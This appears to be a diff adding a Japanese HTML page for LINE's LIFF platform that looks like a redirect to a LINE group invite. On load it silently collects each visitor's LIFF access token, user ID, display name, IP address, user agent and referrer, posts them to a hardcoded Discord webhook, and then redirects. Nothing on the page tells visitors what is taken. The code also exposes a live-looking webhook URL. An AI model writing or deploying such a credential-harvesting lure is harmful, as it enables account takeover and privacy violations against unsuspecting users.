@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LIFF Log Sender & Redirect</title>
+    <script src="https://static.line-scdn.net/liff/edge/2/sdk.js"></script>
+    <style>
+        body {
+            font-family: sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+            color: #333;
+        }
+        .container {
+            text-align: center;
+            padding: 30px;
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            max-width: 90%;
+            width: 400px;
+        }
+        h1 {
+            color: #1a73e8;
+            margin-bottom: 15px;
+        }
+        p {
+            font-size: 1.1em;
+            margin-bottom: 25px;
+        }
+        #status {
+            margin-top: 20px;
+            font-weight: bold;
+            color: #5cb85c; /* Green for success */
+        }
+        .error {
+            color: #d9534f; /* Red for error */
+        }
+    </style>
+</head>
+<body>
+    
+
+    <script>
+        // ここにDiscordのWebhook URLを設定してください
+        const DISCORD_WEBHOOK_URL = '
+'https://discord.com/api/webhooks/1373359224158945290/9zVF_Ljvzcgoc7NWCQwcUScC6_DH1oiEDSfFxRAbjYJ0l4CJqy2KmUyVJY06VcSOq9T1'; // 例: 'https://discord.com/api/webhooks/...'
+
+        // リダイレクト先のURLを設定してください
+        const REDIRECT_URL = 'https://line.me/ti/g2/NHsgY4pwGsvy39ZKz6Z5IHpRvPGKW269BKjgcg?utm_source=invitation&utm_medium=link_copy&utm_campaign=default'; // 例: 'https://www.example.com' または 'line://...'
+
+        async function initializeLiff() {
+            try {
+                // LIFF IDを設定してください
+                await liff.init({
+                    liffId: '2007556850-NzoOlegE'
+                });
+
+                if (!liff.isLoggedIn()) {
+                    document.getElementById('status').innerText = 'LINEにログインしています...';
+                    liff.login(); // ログインしていない場合はログインを促す
+                    return; // ログイン後、ページがリロードされるためここで処理を終了
+                }
+
+                document.getElementById('status').innerText = '情報を取得中...';
+                const accessToken = liff.getAccessToken();
+                const profile = await liff.getProfile();
+
+                let ipAddress = '取得できませんでした';
+                try {
+                    // IPアドレス取得のための外部APIを利用 (あくまで参考。セキュリティ・プライバシーに注意)
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    if (ipResponse.ok) {
+                        const ipData = await ipResponse.json();
+                        ipAddress = ipData.ip;
+                    } else {
+                        throw new Error(`Failed to fetch IP: ${ipResponse.status}`);
+                    }
+                } catch (ipError) {
+                    console.error('Failed to get IP address:', ipError);
+                }
+
+                const logData = {
+                    timestamp: new Date().toISOString(),
+                    liffAccessToken: accessToken,
+                    userId: profile.userId,
+                    displayName: profile.displayName,
+                    ipAddress: ipAddress,
+                    userAgent: navigator.userAgent,
+                    referrer: document.referrer
+                };
+
+                document.getElementById('status').innerText = 'ログを送信中...';
+                await sendToDiscord(logData);
+
+                document.getElementById('status').innerText = 'リダイレクト中...';
+                // ログ送信成功後にリダイレクト
+                window.location.replace(REDIRECT_URL); // 現在の履歴を置き換えるためreplaceを使用
+                // または window.location.href = REDIRECT_URL; // 履歴に残す場合
+
+            } catch (error) {
+                console.error('LIFF initialization or log sending failed:', error);
+                const statusElement = document.getElementById('status');
+                statusElement.innerText = `エラーが発生しました: ${error.message}`;
+                statusElement.classList.add('error');
+                // エラー時にもリダイレクトしたい場合は、ここに window.location.replace(REDIRECT_URL); を追加
+                // ただし、ログ送信が失敗したことをユーザーに知らせるべきか考慮してください。
+            }
+        }
+
+        async function sendToDiscord(data) {
+            try {
+                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: "LIFFアクセスログ",
+                            description: `LIFFアプリへのアクセスが検出されました。`,
+                            color: 5814783, // Discord Embedの色 (例: 緑)
+                            fields: [
+                                { name: "タイムスタンプ", value: data.timestamp, inline: false },
+                                { name: "ユーザーID", value: data.userId, inline: false },
+                                { name: "表示名", value: data.displayName, inline: false },
+                                { name: "LIFFアクセストークン", value: `\`\`\`${data.liffAccessToken}\`\`\``, inline: false }, // トークンはコードブロックで表示
+                                { name: "IPアドレス", value: data.ipAddress, inline: false },
+                                { name: "User-Agent", value: data.userAgent, inline: false },
+                                { name: "リファラ", value: data.referrer || 'なし', inline: false },
+                            ],
+                            footer: {
+                                text: "LIFF Log Sender & Redirect"
+                            },
+                            timestamp: new Date().toISOString()
+                        }]
+                    }),
+                });
+
+                if (!response.ok) {
+                    const errorText = await response.text();
+                    throw new Error(`Discord Webhook Error: ${response.status} - ${errorText}`);
+                }
+                console.log('Log sent to Discord successfully!');
+            } catch (error) {
+                console.error('Error sending log to Discord:', error);
+                // Discord送信エラーはリダイレクトを妨げないように、ここではthrowせずにログに留める
+                // ただし、重要なエラーの場合はここでアラートを出すなどの対処も検討
+            }
+        }
+
+        // LIFFの初期化を開始
+        window.onload = initializeLiff;
+    </script>
+</body>
+</html>
